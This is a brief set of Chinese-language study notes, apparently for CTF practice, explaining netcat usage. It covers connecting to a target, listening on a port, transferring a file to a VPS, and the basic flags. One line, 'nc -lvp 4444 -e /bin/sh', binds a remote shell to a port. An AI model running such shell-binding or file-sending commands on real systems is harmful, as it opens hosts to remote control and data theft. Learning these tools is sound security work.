%%nc可以:
- 连别人的服务器
- 自己开端口等别人连
- 传文件 , 发数据 , 甚至当简易shell用
%%

nc <域名> <端口>
连上目标容器

nc -lvp 4444 > ez-nc
在本地上开一个监听ez-nc文件
%%
-l  监听模式
-v 显示详细信息
-p 指定端口
"> ez_nc"表示把接收到的数据存成ez-nc
%%

nc <vps_ip> 4444 < ez-nc
就能把文件直接传过来

nc 公网ip 4444 < ez-nc
< ez-nc 表示把ez-nc内容发送给电脑

nc基础参数:
- -l   listen 开启监听模式
- -v  verbose  显示详细日志(连没连上,传了多少数据)
- -p port  指定本地端口(监听时用)
- -u udp  用UDP协议(默认tcp,ctf几乎不用)
- -e execute 执行命令 (危险!很多系统禁用)
nc -lvp 4444 -e /bin/sh

nc <域名> <端口>
输入的内容发送给靶机
靶机的输出显示到终端
